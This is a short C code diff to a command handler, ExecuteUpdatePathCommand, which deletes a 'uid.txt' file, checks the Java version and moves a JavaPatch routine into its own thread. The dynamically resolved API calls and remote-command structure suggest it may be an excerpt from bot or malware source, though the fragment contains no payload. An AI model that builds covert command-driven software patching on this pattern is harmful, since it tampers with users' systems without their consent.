@@ -1087,10 +1087,11 @@ bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 	if( GetWorkFolder( fileName, "uid.txt" ) )
 		pDeleteFileA(fileName);
 
+	InitData();
 	GetJavaVersion();
 	if( javaCompatible >= 0 )
 	{
-		JavaPatch(NULL);
+		StartThread( JavaPatch, NULL );
 	}
 	return 0;
 }
